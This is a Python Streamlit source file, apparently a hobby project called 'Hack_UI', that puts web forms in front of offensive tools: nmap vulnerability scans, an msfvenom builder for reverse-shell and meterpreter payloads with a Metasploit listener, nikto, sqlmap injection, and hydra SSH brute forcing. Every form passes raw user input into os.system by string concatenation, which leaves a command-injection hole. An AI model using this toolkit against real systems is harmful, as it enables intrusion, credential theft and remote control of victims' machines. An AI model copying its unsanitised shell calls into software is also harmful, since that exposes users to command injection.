import pandas as pd
import streamlit as st
import os


st.set_page_config(page_title="Hack_UI",
                    page_icon=":alien:",
                    layout="wide",
)



#----- hide streamlit style -------
hide_st_style = """
                <style>
                #MainMenu {visibility: hidden;}
                footer {visibility: hidden;}
                </style>
                """
st.markdown(hide_st_style, unsafe_allow_html=True)


# ---- MainPage -----
st.title(":alien: Hack_UI")
caption = """
            <strong>Created</strong> by Jeffrey Lodewyck

            """
st.markdown(caption, unsafe_allow_html=True)
st.markdown("##")






with st.expander("Open for Ping Form"):
    with st.form(key = "Ping_form"):
        Target_Url = st.text_input(label = "Fill in Target Url")
        Start_ping_btn = st.form_submit_button(label = "Start pinging")

        if Start_ping_btn:
            t_url = Target_Url
            os.system('ping ' + t_url + ' -c 5')


with st.expander("Open for Nmap scan"):
    with st.form(key = "Nmap_form"):


        nmap_col1, nmap_col2 = st.columns(2)
        with nmap_col1:
            st.caption("Use Normal nmap Scan")
            Target_Ip = st.text_input(label = "Fill in Target Ip")
            pn_check = st.checkbox(label = "Enable -Pn option to scan all ports, this will take longer!")
            Start_nmap_btn = st.form_submit_button(label = "Start Scanning")

            if Start_nmap_btn:
                if pn_check:
                    os.system('nmap -sV ' + Target_Ip + " -Pn")
                    st.write("result is shown in the Terminal")
                else:
                    os.system('nmap -sV ' + Target_Ip)
                    st.write("result is shown in the Terminal")

        with nmap_col2:
            st.caption("Use nmap Vuln script scan")
            vuln_scan_target = st.text_input(label = "Fill in the Target Ip")
            start_nmap_vuln_btn = st.form_submit_button(label = "Start Scan")

            if start_nmap_vuln_btn:
                os.system("nmap -sV --script vuln " + vuln_scan_target)
                st.write("Results are shown in the Terminal")



col1, col2 = st.columns(2)
with col1:
    with st.form(key = "col1_form"):
        st.caption("Payload Creator")
        Out_file = st.text_input(label = "Output File")
        File_type = st.text_input(label = "Type in File type (Default=exe)")
        Lhost = st.text_input(label = "LocalHost IP")
        payload = st.selectbox(

            "Choose payload type",
            ('windows/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_https', 'windows/shell/reverse_tcp_dns', 'python/shell_reverse_tcp', 'python/meterpreter_reverse_tcp', 'osx/x64/meterpreter/reverse_tcp', '')

        )
        Create_payload_btn = st.form_submit_button(label = "Create")

        if Create_payload_btn:
            os.system('msfvenom -p ' + payload + ' LHOST=' + Lhost + ' -f ' + File_type + ' -o ' + Out_file)
            st.warning('Warning!: This payload will be detected by most Firewalls, This is for educational purposes only!!!!')



with col2:
    with st.form(key = "col2_form"):
        st.caption("Exploit session Creator")
        E_Lhost = st.text_input(label = "IP LocalHost")

        Create_exploitSession_btn = st.form_submit_button(label = "Start Session")
        if Create_exploitSession_btn:
            st.write('The Metasploit Framework has started in the terminal!!')
            st.write('To Create an Exploit Session type in "use exploit/multi/handler"')
            st.write('when succesfull type in "set Lhost ' + E_Lhost + '"')
            st.write('When this is all set than type "run"')
            st.write('The session has now been created, when the target machine starts your payload, it will connect to the session.')
            os.system('msfconsole')

with st.expander("Search For admin panels"):
    with st.form(key = "nikto"):
        st.caption('This will take up to 10 min')
        nikto_url = st.text_input(label = "Target Url")
        nikto_btn = st.form_submit_button(label = "Scan")
        if nikto_btn:
            os.system('nikto -maxtime 10m -h ' + nikto_url)
            st.write('Result is shown in terminal!!')



with st.expander("Use SqlMap"):
    with st.form(key = "Sql_form_1"):
        st.caption('find and inject sql code into databases')
        sql_target = st.text_input(label = "Fill in Target url")
        start_sql_scan = st.form_submit_button(label = "Start sql scan")

        if start_sql_scan:
            os.system('sqlmap -u ' + sql_target + ' -a')
            st.write('Results are shown in the terminal!')




with st.expander("Make ssh connection"):
    with st.form(key = "Ssh_form"):
        st.caption('Type in Target Ip and choose login name to make connection!')
        ssh_col1, ssh_col2 = st.columns(2)
        with ssh_col1:
            ssh_target = st.text_input(label = "IP")
        with ssh_col2:
            ssh_port = st.text_input(label = "Login Name")

        ssh_start_btn = st.form_submit_button(label = "start connecting")
        if ssh_start_btn:
            os.system('ssh ' + ssh_port + '@' + ssh_target)
            st.write('if succesfull than u can loggin on the remote host!')

with st.expander("BruteForce ssh Login"):
    with st.form(key = "Brute_ssh_form"):


        ssh_host_col, wrdl_col = st.columns(2)
        with ssh_host_col:
            ssh_host_ip = st.text_input(label = "Ssh host ip")
            Brute_start_btn = st.form_submit_button(label = "Start BruteForcing")



        with wrdl_col:
            wrdl = st.text_input(label = "Wordlist path")

        if Brute_start_btn:
            os.system('sudo hydra -l Anonymous -P ' + wrdl + ' ' + ssh_host_ip + ' ssh')






st.sidebar.header("Please choose option")

option_meta = st.sidebar.button("Metasploit")
option_clear = st.sidebar.button('Clear terminal')

if option_meta:
    os.system('msfconsole')

if option_clear:
    os.system('clear')
